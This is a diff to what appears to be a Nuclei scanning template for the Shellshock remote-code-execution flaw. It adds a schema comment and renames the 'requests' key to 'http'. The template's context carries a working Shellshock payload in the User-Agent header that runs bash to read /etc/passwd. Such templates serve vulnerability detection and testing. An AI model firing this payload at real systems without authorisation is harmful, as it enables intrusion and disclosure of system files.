@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: rce-user-agent-shell-shock
 
 info:
@@ -5,7 +6,7 @@ info:
  author: 0xelkomy
  severity: high
 
-requests:
+http:
  - method: GET
    headers:
     User-Agent: "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'"
